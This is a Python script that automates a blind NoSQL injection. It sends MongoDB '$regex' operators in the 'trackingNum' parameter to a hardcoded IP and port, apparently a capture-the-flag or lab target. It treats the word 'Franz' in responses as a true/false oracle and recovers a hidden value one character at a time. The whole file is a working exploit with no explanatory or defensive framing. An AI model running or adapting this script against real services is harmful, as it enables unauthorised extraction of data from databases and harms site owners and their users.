import requests
import json
import string

alphabet = string.ascii_lowercase + string.ascii_uppercase
alphabet += string.digits + "_@{}-/()!\"%=^[]:;"

param_name = 'trackingNum'
false_value = 'DoesNotExist'
init_value = '32A'
success_str = 'Franz'
schema = 'http://'
fqdn = '144.126.236.139'
port = ':31774'
path = '/index.php'
url = f'{schema}{fqdn}{port}{path}'



def oracle_get(t):
    r = requests.get(f"{url}?{param_name}[$regex]=^{t}.*")
    return success_str in r.text

def oracle_post(t):
    r = requests.post(
        url,
        headers = {"Content-Type": "application/json"},
        data = json.dumps({f"{param_name}": t})
    )
    return success_str in r.text

print(url)
assert (oracle_post(false_value) == False)
assert (oracle_post({"$regex": f"^{init_value}.*"}) == True)

current_value = init_value
finished = False
while not finished: 
    finished = True
    for c in alphabet: 
        if oracle_post({"$regex": "^" + current_value + c}): 
            current_value += c
            finished = False
            print(f'[+] current value: {current_value}')
            break 


assert (oracle_post(current_value) == True)

print("param: " + current_value)


